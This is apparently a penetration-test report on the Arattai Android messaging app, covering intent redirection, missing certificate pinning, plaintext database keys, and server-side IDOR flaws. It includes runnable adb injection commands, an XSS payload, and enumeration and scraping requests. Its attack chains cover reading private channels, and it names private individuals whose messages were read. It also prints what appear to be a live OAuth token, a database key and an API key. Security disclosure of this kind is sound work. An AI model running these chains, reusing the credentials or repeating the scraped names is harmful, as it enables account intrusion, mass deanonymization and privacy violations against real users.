# Arattai (com.aratai.chat) v1.54.0 — Security Assessment Report

**Date:** 2026-10-05  
**Target:** Arattai Messaging App (Android)  
**Package:** com.aratai.chat  
**Version:** 1.54.0  
**Type:** Authorized Penetration Test  

---

## Executive Summary

The Arattai messaging application contains multiple high-severity vulnerabilities that can be chained for significant impact. The most critical findings involve an **intent proxy vulnerability** in the exported `ExternalEntryPointActivity` that allows any malicious app to inject attacker-controlled data, URLs, flags, and actions into the app's internal deep link router. Combined with **zero SSL certificate pinning**, **plaintext database encryption keys**, and **unprotected broadcast receivers**, these findings pose serious risks to user privacy and data integrity.

---

## CRITICAL FINDINGS

### 1. Intent Proxy / Intent Redirection via ExternalEntryPointActivity
**Severity: HIGH**  
**File:** `ExternalEntryPointActivity.java` (lines 638-662)

**Description:**  
`ExternalEntryPointActivity` is exported and handles multiple intent actions (VIEW, SEND, SENDTO, SEND_MULTIPLE). For non-SEND intents, it creates a new intent to `HomeActivity` and copies attacker-controlled fields:

```java
intent8.setDataAndType(getIntent().getData(), getIntent().getType());
intent8.setAction(getIntent().getAction());
intent8.setFlags(65536);
if (!z4) {
    intent8.setFlags(intent8.getFlags() | getIntent().getFlags());  // ATTACKER FLAGS ORED IN
}
intent8.setSelector(getIntent().getSelector());
```

**Impact:**
- Attacker can inject `FLAG_GRANT_READ_URI_PERMISSION` (0x1) and `FLAG_GRANT_WRITE_URI_PERMISSION` (0x2) into the forwarded intent
- Attacker-controlled `content://` URIs, `data`, `type`, `action`, and `selector` are forwarded to HomeActivity's internal deep link router
- The selector field bypass can redirect the intent to arbitrary components

**Dynamic Proof:**
- `am start -n com.aratai.chat/...ExternalEntryPointActivity -a android.intent.action.VIEW -d 'https://evil.attacker.com/phishing'` → Intent forwarded to HomeActivity, processed by deep link router
- `am start ... -d 'https://meet.arattai.in/join/FAKE-MEETING-ID'` → App **attempted to join the fake meeting** (server-side request made), showing "Error while joining" toast
- `am start ... -d 'content://com.aratai.chat.provider/files/...' -f 0x3` → Content URI with grant flags forwarded to internal handler

**Reproduction:**
```bash
adb shell am start -n com.aratai.chat/com.arattai.home.presentation.ui.ExternalEntryPointActivity \
  -a android.intent.action.VIEW \
  -d 'https://meet.arattai.in/join/ATTACKER-MEETING-ID'
```

---

### 2. Zero SSL Certificate Pinning
**Severity: HIGH**

**Description:**  
The app implements **no app-level certificate pinning** whatsoever. `okhttp3.CertificatePinner` class does not exist in the APK (confirmed via ClassNotFoundException). Only Android platform-level SSL validation is present, which is trivially bypassed with Frida or a user-installed CA certificate.

**Dynamic Proof:**
- Frida SSL bypass script successfully intercepted all HTTPS traffic with only platform-level hooks
- App traffic flows through Burp proxy after installing Burp CA (no additional bypass needed for the app itself)
- Zoho Apptics analytics traffic captured: device IDs, user IDs, app version IDs exposed in URL parameters

**Impact:**
- Complete MITM interception of all app traffic on any network where attacker can install a CA or perform ARP spoofing
- All API endpoints, auth tokens, message content, and user data exposed to network-level attackers
- Particularly severe for a messaging app handling E2EE communications

---

### 3. Database Encryption Key Stored in Plaintext SharedPreferences
**Severity: HIGH**

**Description:**  
The SQLite database encryption key is stored in plaintext in `shared_prefs/arattai_local_db_key.xml`:

```xml
<string name="key_id">1791195351071</string>
<string name="key">L3Tkqw1TVFcDj4ToMnTa13hw8cHAXDgS/yNZf1AGBU4=</string>
<string name="zuid">20034686476</string>
```

This key encrypts the following databases:
- `arattai_20034686476.db` — Main app database
- `arattai_messages_20034686476.db` — Messages
- `arattai_enc_messages_20034686476.db` — E2EE messages
- `arattai_channel_messages_20034686476.db` — Channel messages
- `arattai_cloud_messages_20034686476.db` — Cloud messages
- `arattai_aes_keys_20034686476.db` — AES encryption keys
- `arattai_files_20034686476.db` — File metadata
- `iamoauthNativelib.db` — OAuth tokens

**Impact:**
- Any app with root access, or physical access to the device, can decrypt ALL message databases
- On Android < 9 or rooted devices, SharedPreferences are accessible to backup tools
- The key should be stored in Android Keystore (hardware-backed), not in XML files
- Combined with the overly-broad FileProvider paths, this is a complete data exposure chain

---

### 4. Sensitive Cryptographic Material in SharedPreferences
**Severity: HIGH**

**Description:**  
Beyond the DB key, critical cryptographic material is stored in SharedPreferences `20034686476.xml`:

- **`e2ee_signed_pre_key`** — Signal protocol signed pre-key (base64-encoded protobuf)
- **`business_auth_enc_wrapped_private_key`** — Wrapped private key for business authentication (1,600+ char base64 blob)
- **`e2ee_pre_key_start_id`** — Pre-key counter (value: 9826)
- **`newinsid`** — Installation/session ID

While some values use `EncryptedSharedPreferences` (Tink/AES-GCM), the Tink keysets themselves are stored alongside the encrypted data in the same file, which defeats the purpose.

**Impact:**
- E2EE key compromise → ability to decrypt end-to-end encrypted messages
- Business auth private key exposure → account takeover for business accounts
- Session ID exposure → session hijacking

---

### 5. Overly Broad FileProvider Configuration
**Severity: MEDIUM**

**File:** `res/xml/provider_paths.xml`

```xml
<files-path name="files" path="." />
<cache-path name="cache" path="." />
<external-path name="external_files" path="." />
```

**Impact:**
- All files in the app's internal storage, cache, and external storage are grantable via FileProvider
- Combined with the intent proxy (Finding #1) and flag injection, an attacker can potentially read arbitrary app files
- The `path="."` should be restricted to only the specific subdirectories needed

---

### 6. Exported Activities Expose Sensitive Functionality Without Authentication
**Severity: MEDIUM**

Three activities are exported without permission requirements:

| Activity | Impact |
|---|---|
| `AadharVerificationActivity` | Aadhaar (national ID) verification flow accessible from any app |
| `StorageUsageActivity` | Leaks user's storage breakdown (images/videos/audio/files count and sizes) |
| `PreviewActivity` | Media preview accessible externally |

**Dynamic Proof (all confirmed with screenshots):**
- `StorageUsageActivity` → Shows "Manage storage" with real data breakdown
- Both accessible in authenticated AND unauthenticated states
- No permission checks or caller validation

---

### 7. Unprotected Notification Broadcast Receiver
**Severity: MEDIUM**

**Description:**  
`NotificationMessageReceiver` accepts broadcasts with actions `com.zoho.chat.READ` and `com.zoho.chat.REPLY` from any app without permission protection.

**Dynamic Proof:**
```bash
# Mark messages as read
adb shell am broadcast -a com.zoho.chat.READ \
  -n com.aratai.chat/com.arattai.notification.receivers.NotificationMessageReceiver
# Result: Broadcast completed: result=0

# Inject reply
adb shell am broadcast -a com.zoho.chat.REPLY \
  -n com.aratai.chat/... --es android.intent.extra.TEXT 'injected_reply'
# Result: Broadcast completed: result=0
```

**Impact:**
- Any malicious app can silently mark the user's messages as read
- Any malicious app can potentially send replies on behalf of the user
- No user interaction required

---

### 8. SEND Intent Content Injection
**Severity: MEDIUM**

**Description:**  
Sending an `ACTION_SEND` intent to `ExternalEntryPointActivity` opens the share/forward dialog with attacker-controlled text pre-loaded.

**Dynamic Proof:**
```bash
adb shell am start -n com.aratai.chat/...ExternalEntryPointActivity \
  -a android.intent.action.SEND -t 'text/plain' \
  --es android.intent.extra.TEXT 'Attacker controlled content'
```
Opens share dialog showing "My stories" and "Pocket" and would show all contacts as share targets.

**Impact:**
- Social engineering: pre-load a phishing message in the share dialog
- If the user accidentally taps a contact, the attacker's message is sent
- One-tap message injection with user interaction

---

### 9. Sensitive Data in URL Parameters (Analytics)
**Severity: LOW**

**Description:**  
The Zoho Apptics analytics SDK sends device identifiers and user IDs as URL query parameters:

```
https://apptics.zoho.in/sdk/v1/60047369915/453000000002061/engagement/add?
  deviceid=d0a7b24cae080e6d157a377472d3cb8f
  &userid=d0a7b24cae080e6d964e58fb86fced3e
```

**Impact:**
- Device and user IDs visible in server logs, CDN logs, proxy logs
- Persistent tracking identifiers in query strings violate privacy best practices

---

### 10. Hardcoded API Keys and Configuration
**Severity: LOW**

**Description:**  
Multiple API keys and configuration URLs found in the app:

- **Zoho Maps API key:** `60032476758-857170528ac3663a9842a9110c6a6203`
- **Firebase project ID:** `852446314855`
- **Apptics framework ID:** `60047369915` / `453000000002061`
- **CDN base URL:** `https://static.arattaicdn.com/arattai-chat/source`
- **Profile picture domain:** `https://profile.arattai.in`
- **Passcode enforcement:** `ENFORCE_PASSCODE=false` in `conf.properties`

---

### 11. Meeting Join via Deep Link Without Confirmation
**Severity: MEDIUM**

**Description:**  
A deep link to `https://meet.arattai.in/join/<meeting-id>` via `ExternalEntryPointActivity` causes the app to **immediately attempt joining the meeting** without any user confirmation dialog.

**Dynamic Proof:**
- Sent `https://meet.arattai.in/join/FAKE-MEETING-ID` → Toast: "Error while joining" (server-side request made)
- The app makes a network request to the meeting server with the user's authenticated session

**Impact:**
- Attacker can force-join a victim into a meeting (audio/video call)
- User's IP address and presence leaked to the meeting server
- Combined with a malicious meeting controlled by the attacker, this enables eavesdropping

---

## Attack Chains

### Chain A: Full Message Database Theft (Critical)
1. Exploit intent proxy (Finding #1) to access FileProvider paths (Finding #5)
2. Inject `FLAG_GRANT_READ_URI_PERMISSION` via flag injection
3. Read `shared_prefs/arattai_local_db_key.xml` for the plaintext DB key (Finding #3)
4. Read encrypted databases and decrypt with the stolen key
5. **Result:** Complete access to all messages, contacts, encryption keys

### Chain B: Silent Message Manipulation (High)
1. Send `com.zoho.chat.READ` broadcast (Finding #7) to mark all messages as read
2. Send `com.zoho.chat.REPLY` broadcast to send replies as the user
3. **Result:** Silent message manipulation without any user awareness

### Chain C: Forced Meeting Surveillance (High)
1. Craft a deep link: `https://meet.arattai.in/join/<attacker-controlled-meeting>`
2. Deliver via intent proxy (Finding #1)
3. App auto-joins the meeting with authenticated session
4. **Result:** User's camera/microphone potentially activated, presence leaked

---

## Recommendations

1. **Remove exported flag** from `ExternalEntryPointActivity` or add strict input validation and caller verification
2. **Strip intent flags** — never OR attacker-controlled flags; always use hardcoded safe flags
3. **Implement SSL certificate pinning** using OkHttp CertificatePinner or network_security_config
4. **Move encryption keys to Android Keystore** — never store DB keys or crypto material in SharedPreferences
5. **Restrict FileProvider paths** to specific subdirectories instead of `path="."`
6. **Add permission requirements** to NotificationMessageReceiver (e.g., `android:permission="..."`)
7. **Add user confirmation** before joining meetings via deep links
8. **Protect exported activities** with proper permission checks or remove export flag
9. **Move API keys server-side** or use Android Keystore for sensitive keys
10. **Send identifiers in POST body** instead of URL query parameters

---

## API-LEVEL FINDINGS (Dynamically Confirmed)

### 12. PII Leak: Phone Number → User ID Enumeration (No Rate Limit)
**Severity: HIGH**  
**Endpoint:** `GET /v3/directory?phone_number={phone}`  
**Base URL:** `https://chat.arattai.in`

**Description:**  
Any authenticated user can query the `/v3/directory` endpoint with an arbitrary phone number and receive the target user's internal `user_id` (Zoho UID) and account `status`. The endpoint has **zero rate limiting** — 20 requests completed in 1.4 seconds (14 req/sec), enabling mass phone number enumeration.

**Dynamic Proof:**
```
GET /v3/directory?phone_number=916390090194
Authorization: Zoho-oauthtoken 1001.xxx.xxx
X-Reader-Version: 1

Response: {"user_id":"20034686476","status":"active"}

GET /v3/directory?phone_number=919999999999
Response: {"status":"not_found"}
```

- Works with country code (916390090194), + prefix (+916390090194), and without (6390090194)
- 20 sequential requests in 1428ms — zero rate limiting or blocking
- Any authenticated user can enumerate any phone number

**Impact:**
- Mass user enumeration: determine if any phone number is registered on Arattai
- Leaked `user_id` chains into profile photo IDOR (Finding #13)
- Privacy violation: confirms phone number ownership and Arattai usage
- At 14 req/sec, an attacker can scan ~1.2M phone numbers per day

---

### 13. Unauthenticated Profile Photo IDOR
**Severity: HIGH**  
**Endpoint:** `https://profile.arattai.in/file?ID={userId}&fs=thumb`

**Description:**  
Profile photos are accessible via a direct URL using only the user's internal ID — **no authentication required**. When chained with Finding #12, this creates a complete attack chain: Phone Number → user_id → Profile Photo with zero authentication on the photo retrieval.

**Dynamic Proof:**
```
# No auth header needed
GET https://profile.arattai.in/file?ID=20034686476&fs=thumb
→ 200 OK, image/png, 2871 bytes

# Works with different sizes
fs=thumb    → 200, image/png
fs=original → 200, image/png  
fs=medium   → 200, image/png

# Works for any user ID (all return 200)
ID=20034686400 → 200
ID=20034686419 → 200
```

**Impact:**
- Any user's profile photo is accessible without authentication
- Combined with phone number enumeration: enter phone → get photo
- Enables stalking, social engineering, and identity correlation
- Sequential user IDs mean profile photos can be scraped in bulk

---

### 14. Username/Channel Enumeration via Public Lookup
**Severity: MEDIUM**  
**Endpoint:** `GET /v1/usernames/{username}`

**Description:**  
Authenticated users can look up any username/channel name and receive metadata including internal ID, verification status, subscriber count, and photo ID.

**Dynamic Proof:**
```
GET /v1/usernames/test
→ {"data":{"id":"CT_1278677660351993944_20021122480-PC",
    "verification_status":"unverified",
    "photo_id":"CT_...PC|1760229450891",
    "subscribers_count":1,"title":"Test",
    "type":"channel","status":"active"}}

GET /v1/usernames/arattai
→ {"data":{"verification_status":"verified",
    "subscribers_count":35,"type":"channel"}}

GET /v1/usernames/admin → 400 (not found)
```

**Impact:**
- Enumerate all channel/user names on the platform
- Leaked internal IDs, subscriber counts, verification status

---

### 15. Session Data Exposure
**Severity: MEDIUM**  
**Endpoint:** `GET /v3/usersessions`

**Description:**  
Returns complete session information including device model, device name, type, primary device flag, and a 512-character session token.

**Dynamic Proof:**
```
GET /v3/usersessions
→ {"data":[{"device":{"model":"sdk_gphone64_x86_64",
    "name":"sdk_gphone64_x86_64google",
    "type":"ANDROID","is_primary":true},
    "id":"833bf01d...","session_id":"7fd7a24b..."}]}
```

---

### 16. CRITICAL: Channel Message IDOR — Read ANY Channel Without Subscription
**Severity: CRITICAL**  
**Endpoint:** `GET /api/v2/chats/{chat_id}/messages`

**Description:**  
Any authenticated user can read messages from ANY channel on the platform by knowing the channel ID — **no subscription or membership check is performed server-side**. Channel IDs are easily discoverable via the `/v1/usernames/{name}` endpoint. This affects ALL channels including private and internal ones.

**Dynamic Proof — ALL channels tested with `joined=false`:**

| Channel | Subscribers | Messages Accessible | PII Leaked |
|---------|-----------|--------------------|----|
| `support` | 1 | YES — Internal support tickets | Employee name "Dharani G" |
| `internal` | 2 | YES — Company internal messages | Owner "Surya", company "Greytheta" |
| `finance` | 4 | YES — Financial content | Owner "Subhajit Ghosh" |
| `private` | 1 | YES — Private channel | Owner "Chandrika" |
| `cricket` | 17,340 | YES — Full message history | Multiple users |
| `news` | 78 | YES — Daily news digests | Editorial content |
| `engineering` | 7 | YES — Channel creation info | Company info |

**Attack Chain:**
1. `GET /v1/usernames/{name}` → discover channel IDs (enumerable via common words)
2. `GET /api/v2/chats/{channel_id}/messages` → read ALL messages without joining
3. `GET /api/v1/chats/{channel_id}` → get channel metadata (owner name, member count, last message)
4. `GET /v1/chats/{channel_id}/media` → list all shared files with sender names and IDs

**Additional data exposed per channel:**
- Owner name and Zoho UID (e.g., "Subhajit Ghosh", ID "4048627")
- All message content, timestamps, and sender IDs
- File metadata with names, sizes, dimensions
- Image thumbnails (base64-encoded)
- Reaction counts per message
- Last message preview in channel info

**Impact:**
- Read private/internal business channels without authorization
- Access confidential company communications
- Harvest PII (real names, user IDs) from channel ownership data
- Download shared files/media from any channel
- Complete bypass of channel access controls

---

### 17. Unsanitized HTML Storage in Profile "About" Field
**Severity: MEDIUM (Potential Stored XSS)**  
**Endpoint:** `GET /v3/users/me`

**Description:**  
The `about` field in the user profile stores arbitrary HTML without sanitization. An XSS payload set as the "about" text is stored and returned verbatim by the API. If rendered in a WebView or interpreted as HTML by the client when viewing another user's profile, this constitutes stored XSS.

**Dynamic Proof:**
```
GET /v3/users/me
→ {"data":{"name":"badmaash",
    "about":"<img src=x onerror=alert(1)>",
    "country":"in","user_type":"personal_user"}}
```

The UserResponse.Data model (UserResponse.java:567) shows the endpoint returns 15 fields including: id, name, **phone**, user_name, status, verified, chat_id, about, user_type, photo, business_profile, country, language, timezone, verification_info.

---

## COMPLETE Attack Chains

### Chain A: Read Any Channel's Private Messages (Critical — CONFIRMED)
1. Enumerate channel names via `GET /v1/usernames/{name}` → get `channel_id`
2. Access `GET /api/v2/chats/{channel_id}/messages` → read ALL messages without subscription
3. Access `GET /api/v1/chats/{channel_id}` → get owner name, member count
4. Access `GET /v1/chats/{channel_id}/media` → list all shared files with sender names
5. **Result:** Read any channel's messages, files, and member data without authorization

### Chain B: Phone Number → Full Identity Deanonymization (Critical — CONFIRMED)
1. Query `GET /v3/directory?phone_number={target}` → get `user_id` (Finding #12)
2. Access `https://profile.arattai.in/file?ID={user_id}&fs=original` → get profile photo without auth (Finding #13)
3. Profile photo + confirmed phone number + active status = full identity correlation
4. **No rate limiting** enables mass enumeration at 1.2M numbers/day
5. **Result:** Mass deanonymization of Arattai users from phone numbers alone

### Chain C: Silent Message Manipulation (High)
1. Send `com.zoho.chat.READ` broadcast (Finding #7) to mark all messages as read
2. Send `com.zoho.chat.REPLY` broadcast to send replies as the user
3. **Result:** Silent message manipulation without any user awareness

### Chain D: Forced Meeting Surveillance (High)
1. Craft a deep link: `https://meet.arattai.in/join/<attacker-controlled-meeting>`
2. Deliver via intent proxy (Finding #1)
3. App auto-joins the meeting with authenticated session
4. **Result:** User's camera/microphone potentially activated, presence leaked

---

## OAuth Token Details (for Burp Suite reproduction)

```
Access Token (AT): Zoho-oauthtoken 1001.907e5dd63c8e90957074f0ef05684d37.1596a4b8b34b6d6b9707bd8494ff6ea3
Headers: X-Reader-Version: 1, User-Agent: ArattaiAndroid/1.54.0
Base URL: https://chat.arattai.in
Profile URL: https://profile.arattai.in
```

---

## Evidence Files

| File | Description |
|---|---|
| `test_storage_auth.png` | StorageUsageActivity leaking user data |
| `test_proxy_auth.png` | Intent proxy forwarding attacker URL |
| `test_aadhaar_auth.png` | Aadhaar activity accessible externally |
| `test_meeting.png` | Forced meeting join via deep link |
| `test_customscheme.png` | Custom scheme deep link processed |
| `test_send.png` | SEND intent content injection |
| `test_flag_inject.png` | Content URI with flag injection |
| `frida_output3.txt` | Captured network traffic |
| `ssl_bypass_v2.js` | Frida SSL bypass script |
